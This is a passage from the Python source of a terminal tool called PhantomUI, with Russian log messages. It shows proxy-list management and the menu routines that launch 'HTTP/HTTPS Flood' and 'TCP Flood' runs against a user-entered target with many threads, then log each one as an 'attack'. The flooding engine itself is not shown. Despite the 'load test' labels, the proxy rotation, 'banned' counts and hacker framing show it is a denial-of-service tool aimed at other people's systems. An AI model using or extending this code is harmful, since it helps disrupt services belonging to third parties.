            elif choice == '2':
                try:
                    with open('proxies.txt', 'r') as f:
                        count = len([line for line in f if line.strip()])
                    logger.info(f"[OK] Загружено {count} прокси")
                except:
                    logger.warning("[!] Файл не найден")
            elif choice == '3':
                if proxies:
                    print(f"\n{Colors.CYAN}List:{Colors.RESET}")
                    for i, p in enumerate(proxies, 1):
                        print(f"{Colors.CYAN}{i}. {Colors.WHITE}{p}{Colors.RESET}")
                else:
                    print(f"\n{Colors.YELLOW}[!] Пусто{Colors.RESET}")
                input(f"{Colors.CYAN}Press ENTER...{Colors.RESET}")
            elif choice == '4':
                open('proxies.txt', 'w').close()
                logger.info("[OK] Список очищен")
            elif choice == '5':
                logger.info("[!] Проверка прокси...")
                async def check_all():
                    valid = []
                    for p in proxies:
                        if await check_proxy(p):
                            valid.append(p)
                    return valid
                if proxies:
                    valid = asyncio.run(check_all())
                    with open('proxies.txt', 'w') as f:
                        f.write('\n'.join(valid))
                    logger.info(f"[OK] Работает: {len(valid)}/{len(proxies)}")
                time.sleep(1)
    
    async def run_http_test(self):
        self.clear()
        self.matrix_rain(1)
        self.print_header()
        print(f"{Colors.CYAN}║{Colors.RESET}  {Colors.BOLD}{Colors.NEON_GREEN}[HTTP LOAD TEST]{Colors.RESET}{' ' * 94}{Colors.CYAN}║{Colors.RESET}")
        print(f"{Colors.CYAN}║{Colors.RESET}  Type: HTTP/HTTPS Flood{' ' * 76}{Colors.CYAN}║{Colors.RESET}")
        self.print_footer()
        
        url = input(f"\n{Colors.CYAN}[target] Target IP: {Colors.WHITE}")
        if not url.startswith('http'):
            url = 'http://' + url
        
        threads = safe_input_int(f"{Colors.CYAN}Threads (1-{CONFIG['max_threads']}): {Colors.WHITE}", default=100, max_val=CONFIG['max_threads'])
        
        logger.info(f"[target] Запуск HTTP-теста на {url} с {threads} потоками")
        
        tester = LoadTester()
        task = asyncio.create_task(tester.start_http(url, threads))
        
        while tester.running:
            self.print_attack_progress(url, threads, tester)
            await asyncio.sleep(0.3)
        
        tester.stop()
        await task
        
        elapsed = int(time.time() - tester.start_time)
        entry = {
            "target": url,
            "threads": threads,
            "duration": elapsed,
            "requests": tester.requests,
            "success": tester.success,
            "errors": tester.errors,
            "banned": tester.banned,
            "bytes_sent": tester.bytes_sent,
            "avg_rate": int(tester.requests / elapsed) if elapsed > 0 else 0,
            "timestamp": datetime.now().isoformat()
        }
        save_history(entry)
        
        stats = load_total_stats()
        stats["total_attacks"] += 1
        stats["total_requests"] += tester.requests
        stats["total_success"] += tester.success
        stats["total_errors"] += tester.errors
        save_total_stats(stats)
        
        self.clear()
        self.matrix_rain(1)
        self.print_header()
        print(f"{Colors.CYAN}║{Colors.RESET}  {Colors.BOLD}{Colors.NEON_GREEN}[ATTACK FINISHED]{Colors.RESET}{' ' * 95}{Colors.CYAN}║{Colors.RESET}")
        print(f"{Colors.CYAN}║{Colors.RESET}  Requests: {Colors.WHITE}{tester.requests:,}{Colors.RESET}{' ' * 85}{Colors.CYAN}║{Colors.RESET}")
        print(f"{Colors.CYAN}║{Colors.RESET}  Success : {Colors.WHITE}{tester.success:,}{Colors.RESET}{' ' * 86}{Colors.CYAN}║{Colors.RESET}")
        print(f"{Colors.CYAN}║{Colors.RESET}  Errors  : {Colors.WHITE}{tester.errors:,}{Colors.RESET}{' ' * 86}{Colors.CYAN}║{Colors.RESET}")
        print(f"{Colors.CYAN}║{Colors.RESET}  Blocked : {Colors.WHITE}{tester.banned}{Colors.RESET}{' ' * 87}{Colors.CYAN}║{Colors.RESET}")
        print(f"{Colors.CYAN}║{Colors.RESET}  Duration: {Colors.WHITE}{elapsed} sec{Colors.RESET}{' ' * 83}{Colors.CYAN}║{Colors.RESET}")
        print(f"{Colors.CYAN}║{Colors.RESET}  Avg Rate: {Colors.WHITE}{int(tester.requests / elapsed) if elapsed > 0 else 0} req/s{Colors.RESET}{' ' * 79}{Colors.CYAN}║{Colors.RESET}")
        self.print_footer()
        input(f"\n{Colors.CYAN}Press ENTER to continue...{Colors.RESET}")
    
    async def run_tcp_test(self):
        self.clear()
        self.matrix_rain(1)
        self.print_header()
        print(f"{Colors.CYAN}║{Colors.RESET}  {Colors.BOLD}{Colors.NEON_BLUE}[TCP LOAD TEST]{Colors.RESET}{' ' * 97}{Colors.CYAN}║{Colors.RESET}")
        print(f"{Colors.CYAN}║{Colors.RESET}  Type: TCP Flood{' ' * 84}{Colors.CYAN}║{Colors.RESET}")
        self.print_footer()
        
        url = input(f"\n{Colors.CYAN}[target] Target URL: {Colors.WHITE}")
        if not url.startswith('http'):
            url = 'http://' + url
        
        threads = safe_input_int(f"{Colors.CYAN}Threads (1-{CONFIG['max_threads']}): {Colors.WHITE}", default=100, max_val=CONFIG['max_threads'])
        
        logger.info(f"[target] Запуск TCP-теста на {url} с {threads} потоками")
        
        tester = LoadTester()
        task = asyncio.create_task(tester.start_tcp(url, threads))
        
        while tester.running:
            self.print_attack_progress(url, threads, tester)
            await asyncio.sleep(0.3)
        
        tester.stop()
        await task
        
        elapsed = int(time.time() - tester.start_time)
        entry = {
            "target": url,
            "threads": threads,
            "duration": elapsed,
            "requests": tester.requests,
            "success": tester.success,
            "errors": tester.errors,
            "banned": tester.banned,
            "bytes_sent": tester.bytes_sent,
            "avg_rate": int(tester.requests / elapsed) if elapsed > 0 else 0,
            "timestamp": datetime.now().isoformat()
        }
        save_history(entry)
        
        stats = load_total_stats()
        stats["total_attacks"] += 1
        stats["total_requests"] += tester.requests
        stats["total_success"] += tester.success
        stats["total_errors"] += tester.errors
        save_total_stats(stats)
        
        self.clear()
        self.matrix_rain(1)
        self.print_header()
        print(f"{Colors.CYAN}║{Colors.RESET}  {Colors.BOLD}{Colors.NEON_BLUE}[ATTACK FINISHED]{Colors.RESET}{' ' * 95}{Colors.CYAN}║{Colors.RESET}")
        print(f"{Colors.CYAN}║{Colors.RESET}  Requests: {Colors.WHITE}{tester.requests:,}{Colors.RESET}{' ' * 85}{Colors.CYAN}║{Colors.RESET}")
        print(f"{Colors.CYAN}║{Colors.RESET}  Success : {Colors.WHITE}{tester.success:,}{Colors.RESET}{' ' * 86}{Colors.CYAN}║{Colors.RESET}")
        print(f"{Colors.CYAN}║{Colors.RESET}  Errors  : {Colors.WHITE}{tester.errors:,}{Colors.RESET}{' ' * 86}{Colors.CYAN}║{Colors.RESET}")
        print(f"{Colors.CYAN}║{Colors.RESET}  Blocked : {Colors.WHITE}{tester.banned}{Colors.RESET}{' ' * 87}{Colors.CYAN}║{Colors.RESET}")
        print(f"{Colors.CYAN}║{Colors.RESET}  Duration: {Colors.WHITE}{elapsed} sec{Colors.RESET}{' ' * 83}{Colors.CYAN}║{Colors.RESET}")
        print(f"{Colors.CYAN}║{Colors.RESET}  Avg Rate: {Colors.WHITE}{int(tester.requests / elapsed) if elapsed > 0 else 0} req/s{Colors.RESET}{' ' * 79}{Colors.CYAN}║{Colors.RESET}")
        self.print_footer()
        input(f"\n{Colors.CYAN}Press ENTER to continue...{Colors.RESET}")
    
    def render(self):
        if self.current_menu == 'main':
            self.print_main_menu()
        elif self.current_menu == 'info':
            self.print_info_menu()
        elif self.current_menu == 'settings':
            self.print_settings_menu()
        elif self.current_menu == 'history':
            self.print_history_menu()
        elif self.current_menu == 'stats':
            self.print_stats_menu()
        elif self.current_menu == 'logs':
            self.print_logs_menu()
        elif self.current_menu == 'proxy':
            self.print_proxy_menu()
    
    def run(self):
        try:
            while self.running:
                self.render()
                choice = input(f"\n{Colors.CYAN}┌─ {Colors.MAGENTA}Input{Colors.CYAN} ─────────────────────────────────┐\n{Colors.CYAN}│{Colors.RESET} > {Colors.YELLOW}").strip()
                print(f"{Colors.RESET}\n")
                self.handle_input(choice)
                
        except KeyboardInterrupt:
            self.clear()
            exit_msg = f"""
{Colors.MAGENTA}
╔═══════════════════════════════════════════════════════════╗
║        TERMINATING NEURAL LINK...                        ║
║        System Standby Mode Activated                     ║
║        Good Luck, Hacker.                                ║
╚═══════════════════════════════════════════════════════════╝
{Colors.CYAN}[ErrorCode404] Session Ended - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.RESET}
            """
            print(exit_msg)

if __name__ == '__main__':
    app = PhantomUI()
    app.run()
